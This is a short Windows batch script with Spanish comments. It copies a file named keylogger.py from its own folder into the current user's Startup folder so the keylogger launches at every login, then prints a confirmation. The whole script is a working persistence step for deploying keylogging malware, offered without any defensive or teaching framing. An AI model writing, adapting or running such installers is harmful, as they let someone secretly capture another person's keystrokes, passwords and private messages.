@echo off
REM Obtener la ruta del script .bat
set "ruta_script=%~dp0"

REM Definir el nombre del archivo a copiar (que está en la misma carpeta que el script .bat)
set "nombre_archivo=keylogger.py"

REM Combinar la ruta del script con el nombre del archivo
set "archivo_origen=%ruta_script%%nombre_archivo%"

REM Definir la ruta de la carpeta de inicio del usuario actual
set "carpeta_inicio=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

REM Copiar el archivo a la carpeta de inicio
copy "%archivo_origen%" "%carpeta_inicio%"

echo Archivo copiado a la carpeta de inicio.